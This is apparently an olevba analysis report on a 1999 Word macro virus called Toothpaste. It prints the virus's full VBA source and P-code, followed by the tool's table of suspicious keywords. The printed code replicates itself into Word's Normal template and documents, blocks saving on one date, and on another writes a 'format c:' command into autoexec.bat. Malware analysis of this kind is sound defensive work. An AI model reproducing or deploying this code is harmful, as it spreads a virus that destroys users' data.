olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Toothpaste
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Toothpaste - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Toothpaste.frm 
in file: Virus.MSWord.Intended.Toothpaste - OLE stream: 'Macros/VBA/Toothpaste'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub UserForm_Click()
MsgBox "If you don't want to be like everyone else just use AIM toothpaste", vbApplicationModal, "Toothpaste99 AIM"
q = MsgBox("Do you use AIM toothpsate?", vbYesNo, "Answer please!")
If q = vbYes Then
MsgBox "I like you man.I will not destroy your computer.", vbApplicationModal, "UIUPI"
ElseIf q = vbNo Then
MsgBox "You are dead man!I will terminate your computer.", vbApplicationModal, "Toothpaste99"
Open "C:\autoexec.bat" For Random As Paste
Print Paste; "Echo Termination Started"
Print Paste; "Format c: /q > NULL"
Print Paste; "Echo Termination Completed"
Tasks.ExitWindows
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Toothpaste99.bas 
in file: Virus.MSWord.Intended.Toothpaste - OLE stream: 'Macros/VBA/Toothpaste99'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Dim inst(1) As Boolean
VBE.Activevbproject.VBComponents("Toothpaste99").Export "c:\data.mod"
VBE.Activevbproject.VBComponents("Toothpaste").Export "c:\data.frm"
For t = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(t).Name = "Toothpaste99" Or NormalTemplate.VBProject.VBComponents(t) = "Toothpaste" Then inst(0) = True
Next t
For t = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(t).Name = "Toothpaste99" Or ActiveDocument.VBProject.VBComponents(t) = "Toothpaste" Then inst(1) = True
Next t
If inst(0) = True And inst(1) = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\data.mod"
ActiveDocument.VBProject.VBComponents.Import "c:\data.frm"
ElseIf inst(0) = False And inst(1) = True Then
NormalTemplate.VBProject.VBComponents.Import "c:\data.mod"
NormalTemplate.VBProject.VBComponents.Import "c:\data.frm"
End If
If Day(Now) = 12 Then Toothpaste.Show
End Sub
'Aim wm97.toothpaste.b
'Word Version of Toothpaste AIM
Sub FileSave()
If Day(Now) = 14 Then
MsgBox "File can't be saved sorry.The toothpaste do not allow you to save documents."
ActiveDocument.Saved = True
ActiveDocument.Close False
Else
ActiveDocument.Save
End If

End Sub
'copyright yozak 99©.
'Powered by Bizarre VX Network.
Sub Autoexit()
Call AutoClose
MsgBox "Bye,bye,bye!!"
End Sub
'Don't forget to brush your teeth with AIM toothpaste
'Greece 99.
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.Toothpaste
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Toothpaste - 2799 bytes
' Line #0:
' 	FuncDefn (Private Sub Click())
' Line #1:
' 	LitStr 0x0042 "If you don't want to be like everyone else just use AIM toothpaste"
' 	Ld q 
' 	LitStr 0x0010 "Toothpaste99 AIM"
' 	ArgsCall MsgBox 0x0003 
' Line #2:
' 	LitStr 0x001A "Do you use AIM toothpsate?"
' 	Ld vbYes 
' 	LitStr 0x000E "Answer please!"
' 	ArgsLd MsgBox 0x0003 
' 	St _B_var_q 
' Line #3:
' 	Ld _B_var_q 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	LitStr 0x0030 "I like you man.I will not destroy your computer."
' 	Ld q 
' 	LitStr 0x0005 "UIUPI"
' 	ArgsCall MsgBox 0x0003 
' Line #5:
' 	Ld _B_var_q 
' 	Ld kil 
' 	Eq 
' 	ElseIfBlock 
' Line #6:
' 	LitStr 0x0030 "You are dead man!I will terminate your computer."
' 	Ld q 
' 	LitStr 0x000C "Toothpaste99"
' 	ArgsCall MsgBox 0x0003 
' Line #7:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	Ld Tasks 
' 	LitDefault 
' 	Open (For Random)
' Line #8:
' 	MeImplicit 
' 	PrintObj 
' 	Ld Tasks 
' 	PrintItemSemi 
' 	LitStr 0x0018 "Echo Termination Started"
' 	PrintItemNL 
' Line #9:
' 	MeImplicit 
' 	PrintObj 
' 	Ld Tasks 
' 	PrintItemSemi 
' 	LitStr 0x0013 "Format c: /q > NULL"
' 	PrintItemNL 
' Line #10:
' 	MeImplicit 
' 	PrintObj 
' 	Ld Tasks 
' 	PrintItemSemi 
' 	LitStr 0x001A "Echo Termination Completed"
' 	PrintItemNL 
' Line #11:
' 	Ld ExitWindows 
' 	ArgsMemCall File 0x0000 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	EndSub 
' Macros/VBA/Toothpaste99 - 8525 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn _B_var_inst (As Boolean)
' Line #2:
' 	LitStr 0x000B "c:\data.mod"
' 	LitStr 0x000C "Toothpaste99"
' 	Ld VBE 
' 	MemLd Activevbproject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #3:
' 	LitStr 0x000B "c:\data.frm"
' 	LitStr 0x000A "Toothpaste"
' 	Ld VBE 
' 	MemLd Activevbproject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #4:
' 	StartForVariable 
' 	Ld _B_var_t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	MemLd Rnd 
' 	MemLd VBComponents 
' 	MemLd _B_var_if 
' 	For 
' Line #5:
' 	Ld _B_var_t 
' 	Ld Count 
' 	MemLd Rnd 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "Toothpaste99"
' 	Eq 
' 	Ld _B_var_t 
' 	Ld Count 
' 	MemLd Rnd 
' 	ArgsMemLd VBComponents 0x0001 
' 	LitStr 0x000A "Toothpaste"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	LitDI2 0x0000 
' 	ArgsSt _B_var_inst 0x0001 
' 	EndIf 
' Line #6:
' 	StartForVariable 
' 	Ld _B_var_t 
' 	EndForVariable 
' 	NextVar 
' Line #7:
' 	StartForVariable 
' 	Ld _B_var_t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd Rnd 
' 	MemLd VBComponents 
' 	MemLd _B_var_if 
' 	For 
' Line #8:
' 	Ld _B_var_t 
' 	Ld VBProject 
' 	MemLd Rnd 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "Toothpaste99"
' 	Eq 
' 	Ld _B_var_t 
' 	Ld VBProject 
' 	MemLd Rnd 
' 	ArgsMemLd VBComponents 0x0001 
' 	LitStr 0x000A "Toothpaste"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	ArgsSt _B_var_inst 0x0001 
' 	EndIf 
' Line #9:
' 	StartForVariable 
' 	Ld _B_var_t 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	LitDI2 0x0000 
' 	ArgsLd _B_var_inst 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitDI2 0x0001 
' 	ArgsLd _B_var_inst 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #11:
' 	LitStr 0x000B "c:\data.mod"
' 	Ld VBProject 
' 	MemLd Rnd 
' 	MemLd VBComponents 
' 	ArgsMemCall _B_var_elseif 0x0001 
' Line #12:
' 	LitStr 0x000B "c:\data.frm"
' 	Ld VBProject 
' 	MemLd Rnd 
' 	MemLd VBComponents 
' 	ArgsMemCall _B_var_elseif 0x0001 
' Line #13:
' 	LitDI2 0x0000 
' 	ArgsLd _B_var_inst 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	LitDI2 0x0001 
' 	ArgsLd _B_var_inst 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #14:
' 	LitStr 0x000B "c:\data.mod"
' 	Ld Count 
' 	MemLd Rnd 
' 	MemLd VBComponents 
' 	ArgsMemCall _B_var_elseif 0x0001 
' Line #15:
' 	LitStr 0x000B "c:\data.frm"
' 	Ld Count 
' 	MemLd Rnd 
' 	MemLd VBComponents 
' 	ArgsMemCall _B_var_elseif 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld Show 
' 	ArgsLd Now 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Toothpaste 
' 	ArgsMemCall UserForm_Click 0x0000 
' 	EndIf 
' Line #18:
' 	EndSub 
' Line #19:
' 	QuoteRem 0x0000 0x0015 "Aim wm97.toothpaste.b"
' Line #20:
' 	QuoteRem 0x0000 0x001E "Word Version of Toothpaste AIM"
' Line #21:
' 	FuncDefn (Sub Saved())
' Line #22:
' 	Ld Show 
' 	ArgsLd Now 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	LitStr 0x004C "File can't be saved sorry.The toothpaste do not allow you to save documents."
' 	ArgsCall MsgBox 0x0001 
' Line #24:
' 	LitVarSpecial (True)
' 	Ld VBProject 
' 	MemSt ViewVbCode 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld VBProject 
' 	ArgsMemCall Close 0x0001 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	Ld VBProject 
' 	ArgsMemCall id_02B6 0x0000 
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	EndSub 
' Line #31:
' 	QuoteRem 0x0000 0x0014 "copyright yozak 99©."
' Line #32:
' 	QuoteRem 0x0000 0x001E "Powered by Bizarre VX Network."
' Line #33:
' 	FuncDefn (Sub Auto())
' Line #34:
' 	ArgsCall (Call) AutoClose 0x0000 
' Line #35:
' 	LitStr 0x000D "Bye,bye,bye!!"
' 	ArgsCall MsgBox 0x0001 
' Line #36:
' 	EndSub 
' Line #37:
' 	QuoteRem 0x0000 0x0034 "Don't forget to brush your teeth with AIM toothpaste"
' Line #38:
' 	QuoteRem 0x0000 0x000A "Greece 99."
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

